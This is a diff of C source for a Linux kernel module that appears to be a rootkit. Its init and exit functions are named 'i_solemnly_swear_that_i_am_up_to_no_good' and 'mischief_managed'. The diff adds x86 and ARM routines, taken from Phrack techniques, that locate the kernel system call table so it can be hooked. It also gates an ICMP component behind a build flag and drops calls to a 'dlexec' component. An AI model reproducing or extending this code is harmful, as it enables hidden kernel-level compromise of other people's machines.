@@ -1,5 +1,4 @@
 #include "common.h"
-
 #include <linux/capability.h>
 #include <linux/cred.h>
 #include <asm/uaccess.h>
@@ -9,6 +8,9 @@
 #include <net/tcp.h>
 #include <net/udp.h>
 #include <linux/init.h>
+
+
+#define TMPSZ 150
 
 unsigned long *sys_call_table;
 unsigned long *ia32_sys_call_table;
@@ -25,7 +27,27 @@ struct {
     unsigned short off2;
 } __attribute__ ((packed))idt;
 
+#if defined(_CONFIG_X86_)
+// Phrack #58 0x07; sd, devik
+unsigned long *find_sys_call_table ( void )
+{
+    char **p;
+    unsigned long sct_off = 0;
+    unsigned char code[255];
 
+    asm("sidt %0":"=m" (idtr));
+    memcpy(&idt, (void *)(idtr.base + 8 * 0x80), sizeof(idt));
+    sct_off = (idt.off2 << 16) | idt.off1;
+    memcpy(code, (void *)sct_off, sizeof(code));
+
+    p = (char **)memmem(code, sizeof(code), "\xff\x14\x85", 3);
+
+    if ( p )
+        return *(unsigned long **)((char *)p + 3);
+    else
+        return NULL;
+}
+#elif defined(_CONFIG_X86_64_)
 // http://bbs.chinaunix.net/thread-2143235-1-1.html
 unsigned long *find_sys_call_table ( void )
 {
@@ -77,27 +99,52 @@ unsigned long *find_ia32_sys_call_table ( void )
     else
         return NULL;
 }
+#else // ARM
+// Phrack #68 0x06; dong-hoon you
+unsigned long *find_sys_call_table ( void )
+{
+	void *swi_addr = (long *)0xffff0008;
+	unsigned long offset, *vector_swi_addr;
 
+	offset = ((*(long *)swi_addr) & 0xfff) + 8;
+	vector_swi_addr = *(unsigned long **)(swi_addr + offset);
+
+	while ( vector_swi_addr++ )
+		if( ((*(unsigned long *)vector_swi_addr) & 0xfffff000) == 0xe28f8000 )
+        {
+			offset = ((*(unsigned long *)vector_swi_addr) & 0xfff) + 8;
+			return vector_swi_addr + offset;
+		}
+
+	return NULL;
+}
+#endif
 
 static int __init i_solemnly_swear_that_i_am_up_to_no_good ( void )
 {
+   
+    #if defined(_CONFIG_X86_64_)
     ia32_sys_call_table = find_ia32_sys_call_table();
     DEBUG("ia32_sys_call_table obtained at %p\n", ia32_sys_call_table);
+    #endif
 
     sys_call_table = find_sys_call_table();
 
     DEBUG("sys_call_table obtained at %p\n", sys_call_table);
 
-	dlexec_init();
+    #if defined(_CONFIG_ICMP_)
     icmp_init();
+    #endif
 
     return 0;
 }
 
 static void __exit mischief_managed ( void )
 {
-   icmp_exit();
-   dlexec_exit();
+    #if defined(_CONFIG_ICMP_)
+    icmp_exit();
+    #endif
+
 }
 
 module_init(i_solemnly_swear_that_i_am_up_to_no_good);
